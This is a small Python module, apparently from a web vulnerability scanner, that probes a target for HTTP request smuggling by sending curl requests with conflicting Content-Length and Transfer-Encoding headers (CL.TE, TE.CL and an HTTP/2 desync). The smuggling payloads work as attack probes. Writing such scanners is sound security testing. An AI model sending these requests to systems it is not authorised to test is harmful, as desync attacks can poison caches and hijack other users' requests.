#!/usr/bin/env python3
"""HTTP Request Smuggling tests — CL.TE, TE.CL, H2.CL."""

from __future__ import annotations
import logging
import subprocess
from pathlib import Path

logger = logging.getLogger("http-smuggling")


def _run(cmd, timeout=60, input=None):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input)
        return proc.returncode, proc.stdout, proc.stderr
    except Exception as exc:
        return -1, "", str(exc)


def test_http_smuggling(target: str, url: str) -> dict:
    """Test HTTP Request Smuggling — CL.TE, TE.CL, H2.CL."""
    findings = []

    # CL.TE: Content-Length vs Transfer-Encoding
    rc, stdout, _ = _run(
        ["curl", "-s", "--max-time", "5",
         "-H", f"Host: {target}",
         "-H", "Content-Length: 13",
         "-H", "Transfer-Encoding: chunked",
         "-d", "0\r\nSMUGGLED\r\n", url],
        timeout=10,
    )
    if rc == 0 and ("SMUGGLED" in stdout or "502" in stdout):
        findings.append({"type": "http_smuggling_cl_te", "severity": "high"})

    # TE.CL: Transfer-Encoding vs Content-Length
    rc, stdout, _ = _run(
        ["curl", "-s", "--max-time", "5",
         "-H", f"Host: {target}",
         "-H", "Transfer-Encoding: chunked",
         "-H", "Content-Length: 4",
         "-d", "5\r\nSMUGGLED\r\n0\r\n\r\n", url],
        timeout=10,
    )
    if rc == 0 and ("SMUGGLED" in stdout or "502" in stdout):
        findings.append({"type": "http_smuggling_te_cl", "severity": "high"})

    # HTTP/2 CL desync
    rc, stdout, _ = _run(
        ["curl", "-s", "--max-time", "5", "--http2",
         "-H", f":authority: {target}",
         "-H", "content-length: 0",
         "-d", "SMUGGLED_BODY", url],
        timeout=10,
    )
    if rc == 0 and "SMUGGLED" in stdout:
        findings.append({"type": "http_smuggling_h2", "severity": "high"})

    return {"type": "http_smuggling", "vulnerable": len(findings) > 0, "findings": findings}
